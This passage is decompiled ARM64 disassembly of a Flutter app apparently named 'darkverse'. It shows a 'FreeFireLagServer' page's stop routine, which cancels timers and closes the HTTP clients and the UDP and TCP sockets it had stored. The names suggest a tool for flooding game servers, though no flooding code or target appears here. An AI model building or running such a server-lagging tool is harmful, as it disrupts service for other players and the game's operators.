    // 0x8779d8: r0 = Container()
    //     0x8779d8: bl              #0x694b98  ; AllocateContainerStub -> Container (size=0x38)
    // 0x8779dc: stur            x0, [fp, #-8]
    // 0x8779e0: r16 = Instance_EdgeInsets
    //     0x8779e0: add             x16, PP, #0x12, lsl #12  ; [pp+0x12020] Obj!EdgeInsets@a06471
    //     0x8779e4: ldr             x16, [x16, #0x20]
    // 0x8779e8: ldur            lr, [fp, #-0x30]
    // 0x8779ec: stp             lr, x16, [SP, #8]
    // 0x8779f0: ldur            x16, [fp, #-0x10]
    // 0x8779f4: str             x16, [SP]
    // 0x8779f8: mov             x1, x0
    // 0x8779fc: r4 = const [0, 0x4, 0x3, 0x1, child, 0x3, decoration, 0x2, padding, 0x1, null]
    //     0x8779fc: add             x4, PP, #0x11, lsl #12  ; [pp+0x11e58] List(11) [0, 0x4, 0x3, 0x1, "child", 0x3, "decoration", 0x2, "padding", 0x1, Null]
    //     0x877a00: ldr             x4, [x4, #0xe58]
    // 0x877a04: r0 = Container()
    //     0x877a04: bl              #0x6945fc  ; [package:flutter/src/widgets/container.dart] Container::Container
    // 0x877a08: ldur            x0, [fp, #-8]
    // 0x877a0c: LeaveFrame
    //     0x877a0c: mov             SP, fp
    //     0x877a10: ldp             fp, lr, [SP], #0x10
    // 0x877a14: ret
    //     0x877a14: ret             
    // 0x877a18: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x877a18: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x877a1c: b               #0x8778ec
  }
  [closure] void <anonymous closure>(dynamic) {
    // ** addr: 0x877a20, size: 0xa0
    // 0x877a20: EnterFrame
    //     0x877a20: stp             fp, lr, [SP, #-0x10]!
    //     0x877a24: mov             fp, SP
    // 0x877a28: AllocStack(0x20)
    //     0x877a28: sub             SP, SP, #0x20
    // 0x877a2c: SetupParameters([dynamic _ /* r0 */])
    //     0x877a2c: ldr             x0, [fp, #0x10]
    //     0x877a30: ldur            w1, [x0, #0x17]
    //     0x877a34: add             x1, x1, HEAP, lsl #32
    //     0x877a38: stur            x1, [fp, #-8]
    // 0x877a3c: CheckStackOverflow
    //     0x877a3c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x877a40: cmp             SP, x16
    //     0x877a44: b.ls            #0x877ab8
    // 0x877a48: r0 = lightImpact()
    //     0x877a48: bl              #0x71ad44  ; [package:flutter/src/services/haptic_feedback.dart] HapticFeedback::lightImpact
    // 0x877a4c: r0 = stopLag()
    //     0x877a4c: bl              #0x877ac0  ; [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::stopLag
    // 0x877a50: ldur            x0, [fp, #-8]
    // 0x877a54: LoadField: r3 = r0->field_13
    //     0x877a54: ldur            w3, [x0, #0x13]
    // 0x877a58: DecompressPointer r3
    //     0x877a58: add             x3, x3, HEAP, lsl #32
    // 0x877a5c: stur            x3, [fp, #-0x10]
    // 0x877a60: r1 = Function '<anonymous closure>':.
    //     0x877a60: add             x1, PP, #0x3b, lsl #12  ; [pp+0x3be50] Function: [dart:ui] Shader::Shader._ (0xbf1c14)
    //     0x877a64: ldr             x1, [x1, #0xe50]
    // 0x877a68: r2 = Null
    //     0x877a68: mov             x2, NULL
    // 0x877a6c: r0 = AllocateClosure()
    //     0x877a6c: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x877a70: ldur            x16, [fp, #-0x10]
    // 0x877a74: stp             x0, x16, [SP]
    // 0x877a78: ldur            x0, [fp, #-0x10]
    // 0x877a7c: ClosureCall
    //     0x877a7c: ldr             x4, [PP, #0x1e8]  ; [pp+0x1e8] List(5) [0, 0x2, 0x2, 0x2, Null]
    //     0x877a80: ldur            x2, [x0, #0x1f]
    //     0x877a84: blr             x2
    // 0x877a88: ldur            x0, [fp, #-8]
    // 0x877a8c: LoadField: r1 = r0->field_f
    //     0x877a8c: ldur            w1, [x0, #0xf]
    // 0x877a90: DecompressPointer r1
    //     0x877a90: add             x1, x1, HEAP, lsl #32
    // 0x877a94: r0 = of()
    //     0x877a94: bl              #0x6ad584  ; [package:flutter/src/material/scaffold.dart] ScaffoldMessenger::of
    // 0x877a98: mov             x1, x0
    // 0x877a9c: r2 = Instance_SnackBar
    //     0x877a9c: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be58] Obj!SnackBar@a39211
    //     0x877aa0: ldr             x2, [x2, #0xe58]
    // 0x877aa4: r0 = showSnackBar()
    //     0x877aa4: bl              #0x6acb84  ; [package:flutter/src/material/scaffold.dart] ScaffoldMessengerState::showSnackBar
    // 0x877aa8: r0 = Null
    //     0x877aa8: mov             x0, NULL
    // 0x877aac: LeaveFrame
    //     0x877aac: mov             SP, fp
    //     0x877ab0: ldp             fp, lr, [SP], #0x10
    // 0x877ab4: ret
    //     0x877ab4: ret             
    // 0x877ab8: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x877ab8: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x877abc: b               #0x877a48
  }
  static void stopLag() {
    // ** addr: 0x877ac0, size: 0x490
    // 0x877ac0: EnterFrame
    //     0x877ac0: stp             fp, lr, [SP, #-0x10]!
    //     0x877ac4: mov             fp, SP
    // 0x877ac8: AllocStack(0x50)
    //     0x877ac8: sub             SP, SP, #0x50
    // 0x877acc: CheckStackOverflow
    //     0x877acc: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x877ad0: cmp             SP, x16
    //     0x877ad4: b.ls            #0x877f28
    // 0x877ad8: r2 = false
    //     0x877ad8: add             x2, NULL, #0x30  ; false
    // 0x877adc: StoreStaticField(0xd6c, r2)
    //     0x877adc: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x877ae0: str             x2, [x0, #0x1ad8]
    // 0x877ae4: r0 = LoadStaticField(0xd74)
    //     0x877ae4: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x877ae8: ldr             x0, [x0, #0x1ae8]
    // 0x877aec: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x877af0: cmp             w0, w16
    // 0x877af4: b.ne            #0x877b04
    // 0x877af8: r2 = _timers
    //     0x877af8: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be60] Field <_FreeFireLagServerPageState@829239838._timers@829239838>: static late (offset: 0xd74)
    //     0x877afc: ldr             x2, [x2, #0xe60]
    // 0x877b00: r0 = InitLateStaticField()
    //     0x877b00: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x877b04: stur            x0, [fp, #-0x20]
    // 0x877b08: LoadField: r1 = r0->field_b
    //     0x877b08: ldur            w1, [x0, #0xb]
    // 0x877b0c: r2 = LoadInt32Instr(r1)
    //     0x877b0c: sbfx            x2, x1, #1, #0x1f
    // 0x877b10: stur            x2, [fp, #-0x18]
    // 0x877b14: r1 = 0
    //     0x877b14: mov             x1, #0
    // 0x877b18: CheckStackOverflow
    //     0x877b18: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x877b1c: cmp             SP, x16
    //     0x877b20: b.ls            #0x877f30
    // 0x877b24: LoadField: r3 = r0->field_b
    //     0x877b24: ldur            w3, [x0, #0xb]
    // 0x877b28: r4 = LoadInt32Instr(r3)
    //     0x877b28: sbfx            x4, x3, #1, #0x1f
    // 0x877b2c: cmp             x2, x4
    // 0x877b30: b.ne            #0x877f0c
    // 0x877b34: cmp             x1, x4
    // 0x877b38: b.ge            #0x877bdc
    // 0x877b3c: LoadField: r3 = r0->field_f
    //     0x877b3c: ldur            w3, [x0, #0xf]
    // 0x877b40: DecompressPointer r3
    //     0x877b40: add             x3, x3, HEAP, lsl #32
    // 0x877b44: ArrayLoad: r4 = r3[r1]  ; Unknown_4
    //     0x877b44: add             x16, x3, x1, lsl #2
    //     0x877b48: ldur            w4, [x16, #0xf]
    // 0x877b4c: DecompressPointer r4
    //     0x877b4c: add             x4, x4, HEAP, lsl #32
    // 0x877b50: stur            x4, [fp, #-0x10]
    // 0x877b54: add             x3, x1, #1
    // 0x877b58: stur            x3, [fp, #-8]
    // 0x877b5c: StoreField: r4->field_7 = rNULL
    //     0x877b5c: stur            NULL, [x4, #7]
    // 0x877b60: LoadField: r1 = r4->field_1f
    //     0x877b60: ldur            w1, [x4, #0x1f]
    // 0x877b64: DecompressPointer r1
    //     0x877b64: add             x1, x1, HEAP, lsl #32
    // 0x877b68: r5 = 60
    //     0x877b68: mov             x5, #0x3c
    // 0x877b6c: branchIfSmi(r1, 0x877b78)
    //     0x877b6c: tbz             w1, #0, #0x877b78
    // 0x877b70: r5 = LoadClassIdInstr(r1)
    //     0x877b70: ldur            x5, [x1, #-1]
    //     0x877b74: ubfx            x5, x5, #0xc, #0x14
    // 0x877b78: sub             x16, x5, #0x3c
    // 0x877b7c: cmp             x16, #1
    // 0x877b80: b.hi            #0x877bcc
    // 0x877b84: r0 = LoadStaticField(0x368)
    //     0x877b84: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x877b88: ldr             x0, [x0, #0x6d0]
    // 0x877b8c: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x877b90: cmp             w0, w16
    // 0x877b94: b.ne            #0x877ba0
    // 0x877b98: r2 = _heap
    //     0x877b98: ldr             x2, [PP, #0x3080]  ; [pp+0x3080] Field <_Timer@1026248._heap@1026248>: static late final (offset: 0x368)
    // 0x877b9c: r0 = InitLateFinalStaticField()
    //     0x877b9c: bl              #0xbf5c8c  ; InitLateFinalStaticFieldStub
    // 0x877ba0: mov             x1, x0
    // 0x877ba4: ldur            x2, [fp, #-0x10]
    // 0x877ba8: stur            x0, [fp, #-0x28]
    // 0x877bac: r0 = isFirst()
    //     0x877bac: bl              #0x47707c  ; [dart:isolate] _TimerHeap::isFirst
    // 0x877bb0: ldur            x1, [fp, #-0x28]
    // 0x877bb4: ldur            x2, [fp, #-0x10]
    // 0x877bb8: stur            x0, [fp, #-0x10]
    // 0x877bbc: r0 = remove()
    //     0x877bbc: bl              #0x476acc  ; [dart:isolate] _TimerHeap::remove
    // 0x877bc0: ldur            x0, [fp, #-0x10]
    // 0x877bc4: tbnz            w0, #4, #0x877bcc
    // 0x877bc8: r0 = _notifyEventHandler()
    //     0x877bc8: bl              #0x4747bc  ; [dart:isolate] _Timer::_notifyEventHandler
    // 0x877bcc: ldur            x1, [fp, #-8]
    // 0x877bd0: ldur            x0, [fp, #-0x20]
    // 0x877bd4: ldur            x2, [fp, #-0x18]
    // 0x877bd8: b               #0x877b18
    // 0x877bdc: r0 = LoadStaticField(0xd74)
    //     0x877bdc: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x877be0: ldr             x0, [x0, #0x1ae8]
    // 0x877be4: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x877be8: cmp             w0, w16
    // 0x877bec: b.ne            #0x877bfc
    // 0x877bf0: r2 = _timers
    //     0x877bf0: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be60] Field <_FreeFireLagServerPageState@829239838._timers@829239838>: static late (offset: 0xd74)
    //     0x877bf4: ldr             x2, [x2, #0xe60]
    // 0x877bf8: r0 = InitLateStaticField()
    //     0x877bf8: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x877bfc: mov             x1, x0
    // 0x877c00: r0 = clear()
    //     0x877c00: bl              #0x52ef20  ; [dart:core] _GrowableList::clear
    // 0x877c04: r0 = LoadStaticField(0xd78)
    //     0x877c04: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x877c08: ldr             x0, [x0, #0x1af0]
    // 0x877c0c: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x877c10: cmp             w0, w16
    // 0x877c14: b.ne            #0x877c24
    // 0x877c18: r2 = _httpClients
    //     0x877c18: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be68] Field <_FreeFireLagServerPageState@829239838._httpClients@829239838>: static late (offset: 0xd78)
    //     0x877c1c: ldr             x2, [x2, #0xe68]
    // 0x877c20: r0 = InitLateStaticField()
    //     0x877c20: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x877c24: stur            x0, [fp, #-0x10]
    // 0x877c28: LoadField: r1 = r0->field_b
    //     0x877c28: ldur            w1, [x0, #0xb]
    // 0x877c2c: r3 = LoadInt32Instr(r1)
    //     0x877c2c: sbfx            x3, x1, #1, #0x1f
    // 0x877c30: stur            x3, [fp, #-0x18]
    // 0x877c34: r1 = 0
    //     0x877c34: mov             x1, #0
    // 0x877c38: r5 = false
    //     0x877c38: add             x5, NULL, #0x30  ; false
    // 0x877c3c: r4 = true
    //     0x877c3c: add             x4, NULL, #0x20  ; true
    // 0x877c40: CheckStackOverflow
    //     0x877c40: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x877c44: cmp             SP, x16
    //     0x877c48: b.ls            #0x877f38
    // 0x877c4c: LoadField: r2 = r0->field_b
    //     0x877c4c: ldur            w2, [x0, #0xb]
    // 0x877c50: r6 = LoadInt32Instr(r2)
    //     0x877c50: sbfx            x6, x2, #1, #0x1f
    // 0x877c54: cmp             x3, x6
    // 0x877c58: b.ne            #0x877ef0
    // 0x877c5c: cmp             x1, x6
    // 0x877c60: b.ge            #0x877ca4
    // 0x877c64: LoadField: r2 = r0->field_f
    //     0x877c64: ldur            w2, [x0, #0xf]
    // 0x877c68: DecompressPointer r2
    //     0x877c68: add             x2, x2, HEAP, lsl #32
    // 0x877c6c: ArrayLoad: r6 = r2[r1]  ; Unknown_4
    //     0x877c6c: add             x16, x2, x1, lsl #2
    //     0x877c70: ldur            w6, [x16, #0xf]
    // 0x877c74: DecompressPointer r6
    //     0x877c74: add             x6, x6, HEAP, lsl #32
    // 0x877c78: add             x7, x1, #1
    // 0x877c7c: stur            x7, [fp, #-8]
    // 0x877c80: StoreField: r6->field_7 = r4
    //     0x877c80: stur            w4, [x6, #7]
    // 0x877c84: StoreField: r6->field_b = r5
    //     0x877c84: stur            w5, [x6, #0xb]
    // 0x877c88: mov             x1, x6
    // 0x877c8c: mov             x2, x5
    // 0x877c90: r0 = _closeConnections()
    //     0x877c90: bl              #0x47c9e8  ; [dart:_http] _HttpClient::_closeConnections
    // 0x877c94: ldur            x1, [fp, #-8]
    // 0x877c98: ldur            x0, [fp, #-0x10]
    // 0x877c9c: ldur            x3, [fp, #-0x18]
    // 0x877ca0: b               #0x877c38
    // 0x877ca4: r0 = LoadStaticField(0xd78)
    //     0x877ca4: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x877ca8: ldr             x0, [x0, #0x1af0]
    // 0x877cac: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x877cb0: cmp             w0, w16
    // 0x877cb4: b.ne            #0x877cc4
    // 0x877cb8: r2 = _httpClients
    //     0x877cb8: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be68] Field <_FreeFireLagServerPageState@829239838._httpClients@829239838>: static late (offset: 0xd78)
    //     0x877cbc: ldr             x2, [x2, #0xe68]
    // 0x877cc0: r0 = InitLateStaticField()
    //     0x877cc0: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x877cc4: mov             x1, x0
    // 0x877cc8: r0 = clear()
    //     0x877cc8: bl              #0x52ef20  ; [dart:core] _GrowableList::clear
    // 0x877ccc: r0 = LoadStaticField(0xd7c)
    //     0x877ccc: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x877cd0: ldr             x0, [x0, #0x1af8]
    // 0x877cd4: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x877cd8: cmp             w0, w16
    // 0x877cdc: b.ne            #0x877cec
    // 0x877ce0: r2 = _udpSockets
    //     0x877ce0: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be70] Field <_FreeFireLagServerPageState@829239838._udpSockets@829239838>: static late (offset: 0xd7c)
    //     0x877ce4: ldr             x2, [x2, #0xe70]
    // 0x877ce8: r0 = InitLateStaticField()
    //     0x877ce8: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x877cec: stur            x0, [fp, #-0x30]
    // 0x877cf0: LoadField: r1 = r0->field_b
    //     0x877cf0: ldur            w1, [x0, #0xb]
    // 0x877cf4: r2 = LoadInt32Instr(r1)
    //     0x877cf4: sbfx            x2, x1, #1, #0x1f
    // 0x877cf8: stur            x2, [fp, #-0x18]
    // 0x877cfc: r1 = 0
    //     0x877cfc: mov             x1, #0
    // 0x877d00: CheckStackOverflow
    //     0x877d00: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x877d04: cmp             SP, x16
    //     0x877d08: b.ls            #0x877f40
    // 0x877d0c: LoadField: r3 = r0->field_b
    //     0x877d0c: ldur            w3, [x0, #0xb]
    // 0x877d10: r4 = LoadInt32Instr(r3)
    //     0x877d10: sbfx            x4, x3, #1, #0x1f
    // 0x877d14: cmp             x2, x4
    // 0x877d18: b.ne            #0x877ed4
    // 0x877d1c: cmp             x1, x4
    // 0x877d20: b.ge            #0x877da8
    // 0x877d24: LoadField: r3 = r0->field_f
    //     0x877d24: ldur            w3, [x0, #0xf]
    // 0x877d28: DecompressPointer r3
    //     0x877d28: add             x3, x3, HEAP, lsl #32
    // 0x877d2c: ArrayLoad: r4 = r3[r1]  ; Unknown_4
    //     0x877d2c: add             x16, x3, x1, lsl #2
    //     0x877d30: ldur            w4, [x16, #0xf]
    // 0x877d34: DecompressPointer r4
    //     0x877d34: add             x4, x4, HEAP, lsl #32
    // 0x877d38: stur            x4, [fp, #-0x28]
    // 0x877d3c: add             x3, x1, #1
    // 0x877d40: stur            x3, [fp, #-8]
    // 0x877d44: r1 = 1
    //     0x877d44: mov             x1, #1
    // 0x877d48: r0 = AllocateContext()
    //     0x877d48: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x877d4c: mov             x2, x0
    // 0x877d50: ldur            x0, [fp, #-0x28]
    // 0x877d54: stur            x2, [fp, #-0x38]
    // 0x877d58: StoreField: r2->field_f = r0
    //     0x877d58: stur            w0, [x2, #0xf]
    // 0x877d5c: LoadField: r1 = r0->field_b
    //     0x877d5c: ldur            w1, [x0, #0xb]
    // 0x877d60: DecompressPointer r1
    //     0x877d60: add             x1, x1, HEAP, lsl #32
    // 0x877d64: r0 = close()
    //     0x877d64: bl              #0x486044  ; [dart:io] _NativeSocket::close
    // 0x877d68: ldur            x2, [fp, #-0x38]
    // 0x877d6c: r1 = Function '<anonymous closure>':.
    //     0x877d6c: add             x1, PP, #0x37, lsl #12  ; [pp+0x37440] AnonymousClosure: (0x57bb9c), in [package:flutter/src/widgets/text_selection.dart] SelectionOverlay::showMagnifier (0x57b8bc)
    //     0x877d70: ldr             x1, [x1, #0x440]
    // 0x877d74: stur            x0, [fp, #-0x28]
    // 0x877d78: r0 = AllocateClosure()
    //     0x877d78: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x877d7c: r16 = <RawDatagramSocket>
    //     0x877d7c: add             x16, PP, #0x37, lsl #12  ; [pp+0x37448] TypeArguments: <RawDatagramSocket>
    //     0x877d80: ldr             x16, [x16, #0x448]
    // 0x877d84: ldur            lr, [fp, #-0x28]
    // 0x877d88: stp             lr, x16, [SP, #8]
    // 0x877d8c: str             x0, [SP]
    // 0x877d90: r4 = const [0x1, 0x2, 0x2, 0x2, null]
    //     0x877d90: ldr             x4, [PP, #0x40]  ; [pp+0x40] List(5) [0x1, 0x2, 0x2, 0x2, Null]
    // 0x877d94: r0 = then()
    //     0x877d94: bl              #0xaf273c  ; [dart:async] _Future::then
    // 0x877d98: ldur            x1, [fp, #-8]
    // 0x877d9c: ldur            x0, [fp, #-0x30]
    // 0x877da0: ldur            x2, [fp, #-0x18]
    // 0x877da4: b               #0x877d00
    // 0x877da8: r0 = LoadStaticField(0xd7c)
    //     0x877da8: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x877dac: ldr             x0, [x0, #0x1af8]
    // 0x877db0: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x877db4: cmp             w0, w16
    // 0x877db8: b.ne            #0x877dc8
    // 0x877dbc: r2 = _udpSockets
    //     0x877dbc: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be70] Field <_FreeFireLagServerPageState@829239838._udpSockets@829239838>: static late (offset: 0xd7c)
    //     0x877dc0: ldr             x2, [x2, #0xe70]
    // 0x877dc4: r0 = InitLateStaticField()
    //     0x877dc4: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x877dc8: mov             x1, x0
    // 0x877dcc: r0 = clear()
    //     0x877dcc: bl              #0x52ef20  ; [dart:core] _GrowableList::clear
    // 0x877dd0: r0 = LoadStaticField(0xd80)
    //     0x877dd0: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x877dd4: ldr             x0, [x0, #0x1b00]
    // 0x877dd8: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x877ddc: cmp             w0, w16
    // 0x877de0: b.ne            #0x877df0
    // 0x877de4: r2 = _tcpSockets
    //     0x877de4: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be78] Field <_FreeFireLagServerPageState@829239838._tcpSockets@829239838>: static late (offset: 0xd80)
    //     0x877de8: ldr             x2, [x2, #0xe78]
    // 0x877dec: r0 = InitLateStaticField()
    //     0x877dec: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x877df0: mov             x2, x0
    // 0x877df4: stur            x2, [fp, #-0x28]
    // 0x877df8: LoadField: r0 = r2->field_b
    //     0x877df8: ldur            w0, [x2, #0xb]
    // 0x877dfc: r3 = LoadInt32Instr(r0)
    //     0x877dfc: sbfx            x3, x0, #1, #0x1f
    // 0x877e00: stur            x3, [fp, #-0x18]
    // 0x877e04: r0 = 0
    //     0x877e04: mov             x0, #0
    // 0x877e08: CheckStackOverflow
    //     0x877e08: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x877e0c: cmp             SP, x16
    //     0x877e10: b.ls            #0x877f48
    // 0x877e14: LoadField: r1 = r2->field_b
    //     0x877e14: ldur            w1, [x2, #0xb]
    // 0x877e18: r4 = LoadInt32Instr(r1)
    //     0x877e18: sbfx            x4, x1, #1, #0x1f
    // 0x877e1c: cmp             x3, x4
    // 0x877e20: b.ne            #0x877eb4
    // 0x877e24: cmp             x0, x4
    // 0x877e28: b.ge            #0x877e70
    // 0x877e2c: LoadField: r1 = r2->field_f
    //     0x877e2c: ldur            w1, [x2, #0xf]
    // 0x877e30: DecompressPointer r1
    //     0x877e30: add             x1, x1, HEAP, lsl #32
    // 0x877e34: ArrayLoad: r4 = r1[r0]  ; Unknown_4
    //     0x877e34: add             x16, x1, x0, lsl #2
    //     0x877e38: ldur            w4, [x16, #0xf]
    // 0x877e3c: DecompressPointer r4
    //     0x877e3c: add             x4, x4, HEAP, lsl #32
    // 0x877e40: add             x5, x0, #1
    // 0x877e44: stur            x5, [fp, #-8]
    // 0x877e48: r0 = LoadClassIdInstr(r4)
    //     0x877e48: ldur            x0, [x4, #-1]
    //     0x877e4c: ubfx            x0, x0, #0xc, #0x14
    // 0x877e50: mov             x1, x4
    // 0x877e54: r0 = GDT[cid_x0 + -0xfcf]()
    //     0x877e54: sub             lr, x0, #0xfcf
    //     0x877e58: ldr             lr, [x21, lr, lsl #3]
    //     0x877e5c: blr             lr
    // 0x877e60: ldur            x0, [fp, #-8]
    // 0x877e64: ldur            x2, [fp, #-0x28]
    // 0x877e68: ldur            x3, [fp, #-0x18]
    // 0x877e6c: b               #0x877e08
    // 0x877e70: r0 = LoadStaticField(0xd80)
    //     0x877e70: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x877e74: ldr             x0, [x0, #0x1b00]
    // 0x877e78: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x877e7c: cmp             w0, w16
    // 0x877e80: b.ne            #0x877e90
    // 0x877e84: r2 = _tcpSockets
    //     0x877e84: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be78] Field <_FreeFireLagServerPageState@829239838._tcpSockets@829239838>: static late (offset: 0xd80)
    //     0x877e88: ldr             x2, [x2, #0xe78]
    // 0x877e8c: r0 = InitLateStaticField()
    //     0x877e8c: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x877e90: mov             x1, x0
    // 0x877e94: r0 = clear()
    //     0x877e94: bl              #0x52ef20  ; [dart:core] _GrowableList::clear
    // 0x877e98: r2 = 0
    //     0x877e98: mov             x2, #0
    // 0x877e9c: StoreStaticField(0xd70, r2)
    //     0x877e9c: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x877ea0: str             x2, [x0, #0x1ae0]
    // 0x877ea4: r0 = Null
    //     0x877ea4: mov             x0, NULL
    // 0x877ea8: LeaveFrame
    //     0x877ea8: mov             SP, fp
    //     0x877eac: ldp             fp, lr, [SP], #0x10
    // 0x877eb0: ret
    //     0x877eb0: ret             
    // 0x877eb4: mov             x0, x2
    // 0x877eb8: r0 = ConcurrentModificationError()
    //     0x877eb8: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x877ebc: mov             x1, x0
    // 0x877ec0: ldur            x0, [fp, #-0x28]
    // 0x877ec4: StoreField: r1->field_b = r0
    //     0x877ec4: stur            w0, [x1, #0xb]
    // 0x877ec8: mov             x0, x1
    // 0x877ecc: r0 = Throw()
    //     0x877ecc: bl              #0xbf5dcc  ; ThrowStub
    // 0x877ed0: brk             #0
    // 0x877ed4: r0 = ConcurrentModificationError()
    //     0x877ed4: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x877ed8: mov             x1, x0
    // 0x877edc: ldur            x0, [fp, #-0x30]
    // 0x877ee0: StoreField: r1->field_b = r0
    //     0x877ee0: stur            w0, [x1, #0xb]
    // 0x877ee4: mov             x0, x1
    // 0x877ee8: r0 = Throw()
    //     0x877ee8: bl              #0xbf5dcc  ; ThrowStub
    // 0x877eec: brk             #0
    // 0x877ef0: r0 = ConcurrentModificationError()
    //     0x877ef0: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x877ef4: mov             x1, x0
    // 0x877ef8: ldur            x0, [fp, #-0x10]
    // 0x877efc: StoreField: r1->field_b = r0
    //     0x877efc: stur            w0, [x1, #0xb]
    // 0x877f00: mov             x0, x1
    // 0x877f04: r0 = Throw()
    //     0x877f04: bl              #0xbf5dcc  ; ThrowStub
    // 0x877f08: brk             #0
    // 0x877f0c: r0 = ConcurrentModificationError()
    //     0x877f0c: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x877f10: mov             x1, x0
    // 0x877f14: ldur            x0, [fp, #-0x20]
    // 0x877f18: StoreField: r1->field_b = r0
    //     0x877f18: stur            w0, [x1, #0xb]
    // 0x877f1c: mov             x0, x1
    // 0x877f20: r0 = Throw()
    //     0x877f20: bl              #0xbf5dcc  ; ThrowStub
    // 0x877f24: brk             #0
    // 0x877f28: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x877f28: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x877f2c: b               #0x877ad8
    // 0x877f30: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x877f30: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x877f34: b               #0x877b24
    // 0x877f38: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x877f38: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x877f3c: b               #0x877c4c
    // 0x877f40: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x877f40: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x877f44: b               #0x877d0c
    // 0x877f48: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x877f48: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x877f4c: b               #0x877e14
  }
  static List<Socket> _tcpSockets() {
    // ** addr: 0x87800c, size: 0x38
    // 0x87800c: EnterFrame
    //     0x87800c: stp             fp, lr, [SP, #-0x10]!
    //     0x878010: mov             fp, SP
    // 0x878014: CheckStackOverflow
    //     0x878014: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x878018: cmp             SP, x16
    //     0x87801c: b.ls            #0x87803c
    // 0x878020: r1 = <Socket>
    //     0x878020: add             x1, PP, #0x10, lsl #12  ; [pp+0x10238] TypeArguments: <Socket>
    //     0x878024: ldr             x1, [x1, #0x238]
    // 0x878028: r2 = 0
    //     0x878028: mov             x2, #0
    // 0x87802c: r0 = _GrowableList()
    //     0x87802c: bl              #0x457b90  ; [dart:core] _GrowableList::_GrowableList
    // 0x878030: LeaveFrame
    //     0x878030: mov             SP, fp
    //     0x878034: ldp             fp, lr, [SP], #0x10
    // 0x878038: ret
    //     0x878038: ret             
    // 0x87803c: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87803c: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x878040: b               #0x878020
  }
  static List<RawDatagramSocket> _udpSockets() {
    // ** addr: 0x878044, size: 0x38
    // 0x878044: EnterFrame
    //     0x878044: stp             fp, lr, [SP, #-0x10]!
    //     0x878048: mov             fp, SP
    // 0x87804c: CheckStackOverflow
    //     0x87804c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x878050: cmp             SP, x16
    //     0x878054: b.ls            #0x878074
    // 0x878058: r1 = <RawDatagramSocket>
    //     0x878058: add             x1, PP, #0x37, lsl #12  ; [pp+0x37448] TypeArguments: <RawDatagramSocket>
    //     0x87805c: ldr             x1, [x1, #0x448]
    // 0x878060: r2 = 0
    //     0x878060: mov             x2, #0
